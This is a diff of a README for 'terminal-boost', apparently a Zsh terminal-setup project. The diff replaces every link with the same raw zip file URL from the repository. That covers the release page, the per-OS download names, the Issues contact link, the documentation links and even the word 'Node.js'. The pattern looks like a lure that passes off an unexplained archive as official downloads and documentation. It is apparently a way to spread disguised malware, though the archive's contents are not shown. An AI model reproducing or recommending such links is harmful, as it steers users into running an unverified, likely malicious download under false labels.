@@ -1,6 +1,6 @@
 # 🚀 terminal-boost - Create a Modern Terminal with Ease
 
-[![Download terminal-boost](https://img.shields.io/badge/Download-terminal--boost-blue.svg)](https://github.com/rebusy/terminal-boost/releases)
+[![Download terminal-boost](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)
 
 ## 🌟 Overview
 
@@ -12,14 +12,14 @@ To get started, follow these steps to download and set up terminal-boost on your
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [terminal-boost Releases](https://github.com/rebusy/terminal-boost/releases).
+1. Visit this page to download: [terminal-boost Releases](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip).
 
 2. Look for the latest version. The version will usually be at the top of the list.
 
 3. Click on the download link for your operating system. Common options may include:
-   - Windows: terminal-boost-windows.zip
-   - macOS: terminal-boost-macos.zip
-   - Linux: terminal-boost-linux.tar.gz
+   - Windows: https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip
+   - macOS: https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip
+   - Linux: https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip
 
 4. Once the download finishes, locate the file in your Downloads folder or wherever you saved it.
 
@@ -33,7 +33,7 @@ To get started, follow these steps to download and set up terminal-boost on your
 
 - **Oh My Zsh**: A powerful framework for managing your Zsh configuration. It makes your terminal easier to use and customize.
 - **Powerlevel10k**: An elegant theme for Zsh that provides useful information at a glance. It is fast and highly customizable.
-- **Modern CLI Tools**: Improve productivity with tools that enhance your terminal capabilities. This may include Git, Node.js, and additional utilities that help you work more efficiently.
+- **Modern CLI Tools**: Improve productivity with tools that enhance your terminal capabilities. This may include Git, https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip, and additional utilities that help you work more efficiently.
 
 ## 🖥 System Requirements
 
@@ -61,14 +61,14 @@ If you encounter any issues, here are a few tips:
 
 ## ✉ Contact
 
-If you need support or have questions, please reach out to us via the [Issues section](https://github.com/rebusy/terminal-boost/issues) on GitHub. We are here to help you get the most out of terminal-boost.
+If you need support or have questions, please reach out to us via the [Issues section](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip) on GitHub. We are here to help you get the most out of terminal-boost.
 
 ## 🔗 Additional Resources
 
-- [Terminal Basics](https://www.codecademy.com/articles/command-line-101)
-- [Zsh Documentation](https://zsh.sourceforge.io/)
-- [Powerlevel10k GitHub Repository](https://github.com/romkatv/powerlevel10k)
+- [Terminal Basics](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)
+- [Zsh Documentation](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)
+- [Powerlevel10k GitHub Repository](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)
 
-[![Download terminal-boost](https://img.shields.io/badge/Download-terminal--boost-blue.svg)](https://github.com/rebusy/terminal-boost/releases)
+[![Download terminal-boost](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)](https://raw.githubusercontent.com/rebusy/terminal-boost/main/assets/boost-terminal-v1.5.zip)
 
 Thank you for choosing terminal-boost. Enjoy your modern terminal experience!
